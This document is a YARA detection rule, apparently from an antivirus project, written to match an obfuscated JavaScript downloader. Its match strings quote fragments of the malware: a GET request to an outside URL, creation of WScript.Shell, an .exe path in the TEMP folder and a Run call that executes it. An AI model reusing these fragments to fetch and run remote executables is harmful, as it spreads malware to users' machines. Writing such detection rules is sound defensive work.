rule sig_20160401_453e0f187094b719dc1a9b78f84bc9cc {
  meta:
    description = "datamaliciousorder - file 20160401_453e0f187094b719dc1a9b78f84bc9cc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bcbfb883a823487b74454177ff6eadb58e7984894ea7d5a04453776a9cace8bf"

  strings:
    $s1  = "CyEuj[YvLkj](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "function XpdHe(ToLl, LtBqz){YsoWq = YsoWq * 1; return ToLl - LtBqz;};" fullword ascii
    $s3  = "var OoeIpy = function EuuAmv() {return WScript[MeuYr](\"WScript\"+\".Shell\");}(), XgfBq = 11;" fullword ascii
    $s4  = "if (CyEuj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MjAvm(){return KzEek + \"\";};" fullword ascii
    $s6  = "function SknMw() {return OoeIpy[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XJbIQ6iloDN9SC4.ex\" + \"e\";};" fullword ascii
    $s7  = "function ByuOd() {return ((GqQzz == true) && (GqQzz == JcjPj)) ? 1 : YsoWq;};" fullword ascii
    $s8  = "JcjPj = true; " fullword ascii
    $s9  = "function TxVyg(JxgDt){OoeIpy[\"R\"+\"un\"](JxgDt, YsoWq, YsoWq);};" fullword ascii
    $s10 = "var YcSm = false;" fullword ascii
    $s11 = "GqQzz = true; " fullword ascii
    $s12 = "function JjwJsl(DeiZy) {var PnhAzj = (1, 2, 3, 4, 5, DeiZy); return PnhAzj;};" fullword ascii
    $s13 = "var WfYf = new this[\"Date\"]();" fullword ascii
    $s14 = "return XpdHe(ExYvm, FomWzy);" fullword ascii
    $s15 = "}while (FaOfl);" fullword ascii
    $s16 = "var JcjPj = false;" fullword ascii
    $s17 = "var GqQzz = false;" fullword ascii
    $s18 = "function VtdZkr(){return 23;};" fullword ascii
    $s19 = "function OtcQj(){return MeuYr;};" fullword ascii
    $s20 = "function SlGz()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}